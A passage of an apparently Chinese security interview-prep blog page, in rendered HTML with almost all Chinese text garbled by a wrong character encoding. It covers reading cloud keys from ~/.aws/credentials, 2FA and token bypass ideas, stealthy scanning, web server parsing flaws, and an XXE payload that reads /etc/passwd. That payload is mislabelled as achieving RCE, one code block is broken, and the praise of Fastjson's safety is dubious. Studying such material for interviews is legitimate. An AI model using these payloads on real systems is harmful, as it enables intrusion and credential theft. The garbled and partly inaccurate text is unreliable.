æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ/proc/pid/cmdlineï¼‰ï¼Ÿ"></a>2. æ€ä¹ˆæ‰¾å¼€äº†ä»€ä¹ˆæœåŠ¡ï¼ˆ<code>/proc/pid/cmdline</code>ï¼‰ï¼Ÿ</h3><ul><li>é€šè¿‡è¯»å–<code>/proc/[pid]/cmdline</code>æ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œå‚æ•°ã€‚ä¾‹å¦‚ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/[pid]/cmdline</span><br></pre></td></tr></table></figure>å…¶ä¸­<code>[pid]</code>æ˜¯ç›®æ ‡è¿›ç¨‹çš„PIDã€‚è¯¥å‘½ä»¤ä¼šè¾“å‡ºè¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤åŠå…¶å‚æ•°ã€‚</li></ul><h3 id="3-æ€ä¹ˆæ‰¾ç»å¯¹è·¯å¾„ï¼Ÿ"><a href="#3-æ€ä¹ˆæ‰¾ç»å¯¹è·¯å¾„ï¼Ÿ" class="headerlink" title="3. æ€ä¹ˆæ‰¾ç»å¯¹è·¯å¾„ï¼Ÿ"></a>3. æ€ä¹ˆæ‰¾ç»å¯¹è·¯å¾„ï¼Ÿ</h3><ul><li><strong>ä½¿ç”¨<code>find</code>å‘½ä»¤</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name æ–‡ä»¶å -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>ä¾‹å¦‚ï¼ŒæŸ¥æ‰¾<code>file.txt</code>çš„ç»å¯¹è·¯å¾„ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name file.txt -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨<code>realpath</code>å‘½ä»¤</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">realpath</span> æ–‡ä»¶å</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨<code>readlink -f</code>å‘½ä»¤</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">readlink</span> -f æ–‡ä»¶å</span><br><span class="line">  ```ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">### 4. æ€ä¹ˆæ‰¾é…ç½®æ–‡ä»¶ï¼Ÿ</span></span><br><span class="line">- **ä½¿ç”¨`find`å‘½ä»¤æŸ¥æ‰¾é…ç½®æ–‡ä»¶**ï¼š</span><br><span class="line">  ```bash</span><br><span class="line">  find / -name <span class="string">&quot;*.conf&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>æŸ¥æ‰¾å¸¸è§é…ç½®æ–‡ä»¶è·¯å¾„</strong>ï¼šä¾‹å¦‚<code>/etc/nginx/nginx.conf</code>ã€<code>/etc/apache2/apache2.conf</code>ã€<code>/etc/mysql/my.cnf</code>ç­‰ã€‚</li></ul><h3 id="5-Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶"><a href="#5-Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶" class="headerlink" title="5. Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶"></a>5. Linuxå¼€æœºè‡ªå¯åŠ¨æ–‡ä»¶</h3><ul><li>**<code>/etc/rc.local</code>**ï¼šåœ¨æŸäº›Linuxå‘è¡Œç‰ˆä¸­ï¼Œ<code>/etc/rc.local</code>æ–‡ä»¶ä¼šåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œã€‚</li><li>**<code>/etc/init.d</code>**ï¼šè¯¥ç›®å½•ä¸‹çš„è„šæœ¬ä¼šåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œï¼Œå¯ä»¥æ ¹æ®æœåŠ¡åç§°æŸ¥æ‰¾å¯åŠ¨è„šæœ¬ã€‚</li></ul><h3 id="6-èŠäº‘AK-SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡"><a href="#6-èŠäº‘AK-SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡" class="headerlink" title="6. èŠäº‘AK&#x2F;SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡"></a>6. èŠäº‘AK&#x2F;SKç›¸å…³çš„åˆ©ç”¨å’Œé˜²å¾¡</h3><ul><li><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<ul><li>é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è¯»å–äº‘å¹³å°çš„AK&#x2F;SKæ–‡ä»¶ï¼ˆå¦‚<code>~/.aws/credentials</code>ï¼‰ã€‚</li><li>åˆ©ç”¨ç¯å¢ƒå˜é‡æ³„éœ²è·å–AK&#x2F;SKï¼ˆå¦‚<code>printenv</code>å‘½ä»¤ï¼‰ã€‚</li></ul></li><li><strong>é˜²å¾¡æªæ–½</strong>ï¼š<ul><li>é™åˆ¶AK&#x2F;SKçš„æƒé™ï¼Œä»…æˆäºˆå¿…è¦çš„æƒé™ã€‚</li><li>å®šæœŸè½®æ¢AK&#x2F;SKï¼Œé¿å…é•¿æœŸä½¿ç”¨åŒä¸€å¯†é’¥ã€‚</li><li>ä½¿ç”¨äº‘å¹³å°çš„IAMï¼ˆèº«ä»½å’Œè®¿é—®ç®¡ç†ï¼‰åŠŸèƒ½è¿›è¡Œç»†ç²’åº¦çš„æƒé™æ§åˆ¶ã€‚</li></ul></li></ul><h3 id="7-èŠSSOç›¸å…³çš„æ”»å‡»æ–¹å¼"><a href="#7-èŠSSOç›¸å…³çš„æ”»å‡»æ–¹å¼" class="headerlink" title="7. èŠSSOç›¸å…³çš„æ”»å‡»æ–¹å¼"></a>7. èŠSSOç›¸å…³çš„æ”»å‡»æ–¹å¼</h3><ul><li><strong>æ”»å‡»æ–¹å¼</strong>ï¼š<ul><li><strong>ä¼šè¯åŠ«æŒ</strong>ï¼šé€šè¿‡ä¸­é—´äººæ”»å‡»æˆ–XSSæ¼æ´çªƒå–ç”¨æˆ·çš„SSOä¼šè¯ã€‚</li><li><strong>OAuthä»¤ç‰Œçªƒå–</strong>ï¼šé€šè¿‡é’“é±¼æ”»å‡»æˆ–æ¶æ„åº”ç”¨è·å–ç”¨æˆ·çš„OAuthä»¤ç‰Œã€‚</li></ul></li><li><strong>é˜²å¾¡æªæ–½</strong>ï¼š<ul><li>ä½¿ç”¨å¤šå› ç´ è®¤è¯ï¼ˆMFAï¼‰å¢å¼ºå®‰å…¨æ€§ã€‚</li><li>çŸ­ç”Ÿå‘½å‘¨æœŸçš„OAuthä»¤ç‰Œï¼Œå‡å°‘ä»¤ç‰Œè¢«æ»¥ç”¨çš„é£é™©ã€‚</li></ul></li></ul><h3 id="8-æ€ä¹ˆç»•è¿‡åŠ¨æ€Tokenï¼Ÿ"><a href="#8-æ€ä¹ˆç»•è¿‡åŠ¨æ€Tokenï¼Ÿ" class="headerlink" title="8. æ€ä¹ˆç»•è¿‡åŠ¨æ€Tokenï¼Ÿ"></a>8. æ€ä¹ˆç»•è¿‡åŠ¨æ€Tokenï¼Ÿ</h3><ul><li><strong>åˆ©ç”¨æ¼æ´</strong>ï¼šå¦‚æœåŠ¨æ€Tokençš„ç”Ÿæˆé€»è¾‘å­˜åœ¨æ¼æ´ï¼ˆå¦‚åŸºäºæ—¶é—´æˆ³çš„Tokenï¼‰ï¼Œå¯ä»¥é€šè¿‡é¢„æµ‹æˆ–é‡æ”¾æ”»å‡»ç»•è¿‡ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šæ‹¦æˆªåŠ¨æ€Tokençš„ä¼ è¾“è¿‡ç¨‹ï¼Œè·å–Tokenå€¼ã€‚</li></ul><h3 id="9-æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯ï¼Ÿ"><a href="#9-æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯ï¼Ÿ" class="headerlink" title="9. æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯ï¼Ÿ"></a>9. æ€ä¹ˆç»•è¿‡åŒå› å­è®¤è¯ï¼Ÿ</h3><ul><li><strong>ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»</strong>ï¼šé€šè¿‡æ¬ºéª—ç”¨æˆ·è·å–åŒå› å­è®¤è¯çš„éªŒè¯ç ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šæ‹¦æˆªåŒå› å­è®¤è¯çš„éªŒè¯è¿‡ç¨‹ï¼Œçªƒå–éªŒè¯ç ã€‚</li></ul><h3 id="10-å†…ç½‘æ‰«ææœ‰æµé‡æ£€æµ‹æ€ä¹ˆåŠï¼Ÿ"><a href="#10-å†…ç½‘æ‰«ææœ‰æµé‡æ£€æµ‹æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="10. å†…ç½‘æ‰«ææœ‰æµé‡æ£€æµ‹æ€ä¹ˆåŠï¼Ÿ"></a>10. å†…ç½‘æ‰«ææœ‰æµé‡æ£€æµ‹æ€ä¹ˆåŠï¼Ÿ</h3><ul><li><strong>ä½é¢‘æ‰«æ</strong>ï¼šå‡å°‘æ‰«æé¢‘ç‡ï¼Œé¿å…è§¦å‘æµé‡æ£€æµ‹ã€‚</li><li><strong>æœåŠ¡æŒ‡çº¹è¯†åˆ«</strong>ï¼šé€šè¿‡è¢«åŠ¨æ–¹å¼è¯†åˆ«æœåŠ¡ï¼Œå‡å°‘ä¸»åŠ¨æ‰«æçš„æµé‡ã€‚</li></ul><h3 id="11-Redisä¸»ä»å¤åˆ¶æ¡ä»¶"><a href="#11-Redisä¸»ä»å¤åˆ¶æ¡ä»¶" class="headerlink" title="11. Redisä¸»ä»å¤åˆ¶æ¡ä»¶"></a>11. Redisä¸»ä»å¤åˆ¶æ¡ä»¶</h3><ul><li><strong>ä¸»ä»å¤åˆ¶æ¡ä»¶</strong>ï¼šRedisä¸»ä»å¤åˆ¶éœ€è¦é…ç½®<code>slaveof</code>æŒ‡ä»¤ï¼ŒæŒ‡å®šä¸»èŠ‚ç‚¹çš„IPå’Œç«¯å£ã€‚</li><li><strong>ç‰ˆæœ¬é™åˆ¶</strong>ï¼šRedis 3.xåŠä»¥ä¸Šç‰ˆæœ¬æ”¯æŒé›†ç¾¤æ¨¡å¼ï¼Œä¸»ä»å¤åˆ¶åœ¨å•å®ä¾‹å’Œé›†ç¾¤æ¨¡å¼ä¸‹å‡å¯ä½¿ç”¨ã€‚</li></ul><h3 id="12-JWTæ”»å‡»æ–¹å¼"><a href="#12-JWTæ”»å‡»æ–¹å¼" class="headerlink" title="12. JWTæ”»å‡»æ–¹å¼"></a>12. JWTæ”»å‡»æ–¹å¼</h3><ul><li><strong>æ”»å‡»æ–¹å¼</strong>ï¼š<ul><li><strong>Noneç®—æ³•æ”»å‡»</strong>ï¼šå¦‚æœJWTç­¾åç®—æ³•è®¾ç½®ä¸º<code>none</code>ï¼Œå¯ä»¥ç¯¡æ”¹JWTå†…å®¹è€Œä¸è¢«æ£€æµ‹ã€‚</li><li><strong>å¯†é’¥æ³„éœ²</strong>ï¼šé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è·å–JWTçš„ç­¾åå¯†é’¥ã€‚</li></ul></li><li><strong>é˜²å¾¡æªæ–½</strong>ï¼š<ul><li>ä½¿ç”¨å¼ºå¯†é’¥ï¼Œé¿å…å¯†é’¥æ³„éœ²ã€‚</li><li>çŸ­ç”Ÿå‘½å‘¨æœŸçš„JWTï¼Œå‡å°‘è¢«æ»¥ç”¨çš„é£é™©ã€‚</li></ul></li></ul><h2 id="äº¬ä¸œ"><a href="#äº¬ä¸œ" class="headerlink" title="äº¬ä¸œ"></a>äº¬ä¸œ</h2><h3 id="æ–‡ä»¶è§£ææ¼æ´ï¼ˆIISã€Apacheã€Nginxï¼‰"><a href="#æ–‡ä»¶è§£ææ¼æ´ï¼ˆIISã€Apacheã€Nginxï¼‰" class="headerlink" title="æ–‡ä»¶è§£ææ¼æ´ï¼ˆIISã€Apacheã€Nginxï¼‰"></a>æ–‡ä»¶è§£ææ¼æ´ï¼ˆIISã€Apacheã€Nginxï¼‰</h3><ul><li><p><strong>IISè§£ææ¼æ´</strong>ï¼š</p><ul><li><strong>ç›®å½•è§£ææ¼æ´</strong>ï¼šåœ¨ IIS5.x&#x2F;6.0 ä¸­ï¼Œè‹¥åœ¨ç½‘ç«™ä¸‹å»ºç«‹æ–‡ä»¶å¤¹å ä¸º<code>*.asp</code>ç­‰çš„æ–‡ä»¶å¤¹ï¼Œåˆ™å…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½ä¼šè¢« IIS å½“åš asp æ–‡ä»¶æ¥è§£é‡Šå¹¶æ‰§è¡Œã€‚ä¾‹å¦‚åˆ›å»ºç›®å½•<code>test.asp</code>ï¼Œé‚£ä¹ˆ<code>/test.asp/1.jpg</code>å°†è¢«å½“åš asp æ–‡ä»¶æ¥æ‰§è¡Œã€‚</li><li><strong>æ–‡ä»¶åè§£ææ¼æ´</strong>ï¼šåœ¨ IIS5.x&#x2F;6.0 ä¸­ï¼Œåˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œå¦‚<code>xie.asp;.jpg</code> ä¼šè¢«æœåŠ¡å™¨çœ‹æˆæ˜¯<code>xie.asp</code>ï¼Œå¯ç»•è¿‡æ ¡éªŒå¹¶æ‰§è¡Œã€‚</li><li><strong>ç•¸å½¢è§£ææ¼æ´</strong>ï¼šåœ¨ IIS7.0 ä¸­ï¼Œè‹¥ Fast-CGI å¼€å¯ï¼Œå¯å¾€å›¾ç‰‡é‡Œå†™å…¥ä»£ç ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨åï¼Œè®¿é—®<code>/upload/test.jpg/x.php</code>ï¼Œæ­¤æ—¶<code>test.jpg</code>å°†ä¼šè¢«æœåŠ¡å™¨å½“æˆ php æ–‡ä»¶æ‰§è¡Œã€‚</li></ul></li><li><p><strong>Apacheè§£ææ¼æ´</strong>ï¼šä»å·¦è‡³å³å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœä¸ºä¸å¯è¯†åˆ«è§£æï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ã€‚ä¾‹å¦‚æ–‡ä»¶å<code>a.rar.php.jpg</code>ï¼Œè‹¥æœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šè¢«è§£æä¸º php æ–‡ä»¶ã€‚</p></li><li><p><strong>Nginxè§£ææ¼æ´</strong>ï¼š</p><ul><li><strong>ä½ç‰ˆæœ¬æ¼æ´</strong>ï¼šå¦‚ CVE-2013-4547ï¼Œéæ³•å­—ç¬¦ç©ºæ ¼å’Œæˆªæ­¢ç¬¦ï¼ˆ%00ï¼‰ä¼šå¯¼è‡´ Nginx è§£æ URI æ—¶æ··ä¹±ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡éç¼–ç ç©ºæ ¼ç»•è¿‡åç¼€åé™åˆ¶ã€‚</li><li><strong>è·¯å¾„è§£ææ¼æ´</strong>ï¼šå¯¹ä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ <code>/ä»»æ„æ–‡ä»¶å.php</code>æˆ–<code>%00.php</code>ç­‰è¿›è¡Œè§£ææ”»å‡»ã€‚</li></ul></li></ul><h3 id="XXEç›´æ¥RCE"><a href="#XXEç›´æ¥RCE" class="headerlink" title="XXEç›´æ¥RCE"></a>XXEç›´æ¥RCE</h3><p>XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ¼æ´é€šå¸¸ç”¨äºä¿¡æ¯æ³„éœ²å’Œ SSRF æ”»å‡»ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åŠ è½½æ¶æ„ DTD æ–‡ä»¶å®ç° RCEã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåˆ©ç”¨ XXE å®ç° RCE çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://example.com/vulnerable_page&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="string">  &lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="string">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h3 id="èœœç½æº¯æºï¼ˆJSONPï¼‰"><a href="#èœœç½æº¯æºï¼ˆJSONPï¼‰" class="headerlink" title="èœœç½æº¯æºï¼ˆJSONPï¼‰"></a>èœœç½æº¯æºï¼ˆJSONPï¼‰</h3><p>èœœç½æ˜¯ä¸€ç§ç”¨äºæ£€æµ‹å’Œé˜²èŒƒç½‘ç»œæ”»å‡»çš„å·¥å…·ï¼Œé€šè¿‡è®¾ç½®è¯±é¥µæ¥å¸å¼•æ”»å‡»è€…ã€‚æº¯æºåˆ™æ˜¯é€šè¿‡åˆ†ææ”»å‡»è€…çš„ IP åœ°å€ã€è¡Œä¸ºæ¨¡å¼ç­‰ä¿¡æ¯æ¥å®šä½æ”»å‡»è€…ã€‚åœ¨ JSONPï¼ˆJSON with Paddingï¼‰åœºæ™¯ä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨ JSONP çš„å›è°ƒå‡½æ•°æ¥çªƒå–æ•°æ®ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ JSONP èœœç½ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jsonp&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jsonp</span>():</span><br><span class="line">    callback = request.args.get(<span class="string">&#x27;callback&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> callback:</span><br><span class="line">        <span class="comment"># è®°å½•æ”»å‡»è¡Œä¸º</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;attack_log.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f&quot;Attack detected: <span class="subst">&#123;request.remote_addr&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;callback&#125;</span>(&#123;&#123; &#x27;result&#x27;: &#x27;Honey Pot Triggered!&#x27; &#125;&#125;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;No callback provided&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="å†™-Poc-ç”¨-Python-åŠå…¶åº“"><a href="#å†™-Poc-ç”¨-Python-åŠå…¶åº“" class="headerlink" title="å†™ Poc ç”¨ Python åŠå…¶åº“"></a>å†™ Poc ç”¨ Python åŠå…¶åº“</h3><ul><li><strong>Python</strong> æ˜¯ç¼–å†™ Pocï¼ˆProof of Conceptï¼‰çš„å¸¸ç”¨è¯­è¨€ï¼Œå…·æœ‰ä¸°å¯Œçš„åº“æ”¯æŒã€‚</li><li><strong>å¸¸ç”¨åº“</strong>ï¼š<ul><li>**<code>requests</code>**ï¼šç”¨äºå‘é€ HTTP è¯·æ±‚ï¼Œæµ‹è¯• Web åº”ç”¨æ¼æ´ã€‚</li><li>**<code>socket</code>**ï¼šç”¨äºç½‘ç»œé€šä¿¡ï¼Œæµ‹è¯•ç½‘ç»œæœåŠ¡æ¼æ´ã€‚</li><li>**<code>xml.etree.ElementTree</code>**ï¼šç”¨äºè§£æ XML æ–‡ä»¶ï¼Œæµ‹è¯• XXE ç­‰æ¼æ´ã€‚</li><li>**<code>subprocess</code>**ï¼šç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæµ‹è¯•å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</li><li>**<code>paramiko</code>**ï¼šç”¨äº SSH è¿æ¥ï¼Œæµ‹è¯• SSH ç›¸å…³æ¼æ´ã€‚</li><li>**<code>selenium</code>**ï¼šç”¨äºè‡ªåŠ¨åŒ–æµè§ˆå™¨æ“ä½œï¼Œæµ‹è¯• Web åº”ç”¨æ¼æ´ã€‚</li></ul></li></ul><h2 id="é˜¿é‡Œ"><a href="#é˜¿é‡Œ" class="headerlink" title="é˜¿é‡Œ"></a>é˜¿é‡Œ</h2><h3 id="JavaåŸç”Ÿååºåˆ—åŒ–ä¿®å¤"><a href="#JavaåŸç”Ÿååºåˆ—åŒ–ä¿®å¤" class="headerlink" title="JavaåŸç”Ÿååºåˆ—åŒ–ä¿®å¤"></a>JavaåŸç”Ÿååºåˆ—åŒ–ä¿®å¤</h3><ul><li><strong>é‡å†™<code>readObject</code>å’Œ<code>writeObject</code>æ–¹æ³•</strong>ï¼šåœ¨æ•æ„Ÿç±»ä¸­é‡å†™è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œç¦æ­¢æ•æ„Ÿæ“ä½œï¼Œé˜²æ­¢æ¶æ„æ•°æ®çš„ååºåˆ—åŒ–ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨çš„ååºåˆ—åŒ–åº“</strong>ï¼šå¦‚<code>Jackson</code>ã€<code>Gson</code>ç­‰ï¼Œå®ƒä»¬æä¾›äº†æ›´å®‰å…¨çš„ååºåˆ—åŒ–æ–¹å¼ï¼Œé¿å…ç›´æ¥ä½¿ç”¨<code>ObjectInputStream</code>ã€‚</li><li><strong>éªŒè¯è¾“å…¥æ•°æ®</strong>ï¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œå¯¹è¾“å…¥æ•°æ®è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç¡®ä¿å…¶æ¥æºå¯é ä¸”æ ¼å¼æ­£ç¡®ã€‚</li></ul><h3 id="Javaååºåˆ—åŒ–åŒºåˆ«"><a href="#Javaååºåˆ—åŒ–åŒºåˆ«" class="headerlink" title="Javaååºåˆ—åŒ–åŒºåˆ«"></a>Javaååºåˆ—åŒ–åŒºåˆ«</h3><ul><li><strong>JavaåŸç”Ÿååºåˆ—åŒ–</strong>ï¼šç›´æ¥ä½¿ç”¨<code>ObjectInputStream</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œå­˜åœ¨è¾ƒé«˜çš„å®‰å…¨é£é™©ï¼Œå®¹æ˜“å—åˆ°ååºåˆ—åŒ–æ”»å‡»ã€‚</li><li><strong>Fastjsonååºåˆ—åŒ–</strong>ï¼šFastjsonæä¾›äº†æ›´çµæ´»å’Œå®‰å…¨çš„ååºåˆ—åŒ–æ–¹å¼ï¼Œå¯ä»¥é€šè¿‡é…ç½®æ¥æ§åˆ¶å“ªäº›ç±»å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œé™ä½å®‰å…¨é£é™©ã€‚</li><li><strong>Log4jååºåˆ—åŒ–</strong>ï¼šLog4jæœ¬èº«ä¸ç›´æ¥æ¶‰åŠååºåˆ—åŒ–ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå› ä¸ºæ—¥å¿—è®°å½•çš„å†…å®¹åŒ…å«æ¶æ„åºåˆ—åŒ–æ•°æ®è€Œå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚</li></ul><h3 id="Java-Fastjsonä¿®å¤"><a href="#Java-Fastjsonä¿®å¤" class="headerlink" title="Java Fastjsonä¿®å¤"></a>Java Fastjsonä¿®å¤</h3><ul><li><strong>å‡çº§Fastjsonç‰ˆæœ¬</strong>ï¼šç¡®ä¿ä½¿ç”¨çš„æ˜¯æœ€æ–°ç‰ˆæœ¬çš„Fastjsonï¼Œå®˜æ–¹ä¼šä¸æ–­ä¿®å¤å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</li><li><strong>é…ç½®ç™½åå•å’Œé»‘åå•</strong>ï¼šé€šè¿‡é…ç½®ç™½åå•å’Œé»‘åå•æ¥æ§åˆ¶å“ªäº›ç±»å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œé˜²æ­¢æ¶æ„ç±»çš„åŠ è½½ã€‚</li><li><strong>é™åˆ¶ååºåˆ—åŒ–æ·±åº¦</strong>ï¼šè®¾ç½®ååºåˆ—åŒ–çš„æœ€å¤§æ·±åº¦ï¼Œé¿å…è¿‡æ·±çš„åµŒå¥—ç»“æ„å¯¼è‡´çš„æ€§èƒ½é—®é¢˜å’Œå®‰å…¨é£é™©ã€‚</li></ul><h3 id="æœ€è¿‘å®‰å…¨äº‹ä»¶åŠçœ‹æ³•"><a href="#æœ€è¿‘å®‰å…¨äº‹ä»¶åŠçœ‹æ³•" class="headerlink" title="æœ€è¿‘å®‰å…¨äº‹ä»¶åŠçœ‹æ³•"></a>æœ€è¿‘å®‰å…¨äº‹ä»¶åŠçœ‹æ³•</h3><ul><li><strong>Spring4Shell</strong>ï¼šæ˜¯ä¸€ä¸ªå½±å“Spring Frameworkçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ä¿®å¤æ–¹æ³•åŒ…æ‹¬å‡çº§Spring Frameworkåˆ°å®‰å…¨ç‰ˆæœ¬ï¼ŒåŠæ—¶åº”ç”¨å®‰å…¨è¡¥ä¸ã€‚</li><li><strong>Log4Shell</strong>ï¼šæ˜¯ä¸€ä¸ªå½±å“Log4jçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„æ—¥å¿—è®°å½•æ¥è§¦å‘æ¼æ´ã€‚ä¿®å¤æ–¹æ³•åŒ…æ‹¬å‡çº§Log4jåˆ°å®‰å…¨ç‰ˆæœ¬ï¼Œé…ç½®å®‰å…¨ç­–ç•¥æ¥é™åˆ¶JNDIæŸ¥æ‰¾ã€‚</li></ul><h3 id="æŒ‡çº¹è¯†åˆ«è¦ç‚¹"><a href="#æŒ‡çº¹è¯†åˆ«è¦ç‚¹" class="headerlink" title="æŒ‡çº¹è¯†åˆ«è¦ç‚¹"></a>æŒ‡çº¹è¯†åˆ«è¦ç‚¹</h3><ul><li><strong>æœåŠ¡è¯†åˆ«</strong>ï¼šé€šè¿‡ç«¯å£æ‰«æå’Œbanner grabbingæ¥è¯†åˆ«ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œçš„æœåŠ¡åŠå…¶ç‰ˆæœ¬ã€‚</li><li><strong>Webåº”ç”¨è¯†åˆ«</strong>ï¼šé€šè¿‡åˆ†æHTTPå“åº”å¤´ã€é¡µé¢å†…å®¹ç­‰ä¿¡æ¯æ¥è¯†åˆ«Webåº”ç”¨çš„ç±»å‹å’Œç‰ˆæœ¬ã€‚</li><li><strong>æ“ä½œç³»ç»Ÿè¯†åˆ«</strong>ï¼šé€šè¿‡TCP&#x2F;IPæ ˆæŒ‡çº¹ã€æ–‡ä»¶å…±äº«åè®®ç­‰ä¿¡æ¯æ¥è¯†åˆ«ç›®æ ‡ç³»ç»Ÿçš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬ã€‚</li></ul><h3 id="æµ‹ç»˜å¼•æ“å…³é”®å› ç´ "><a 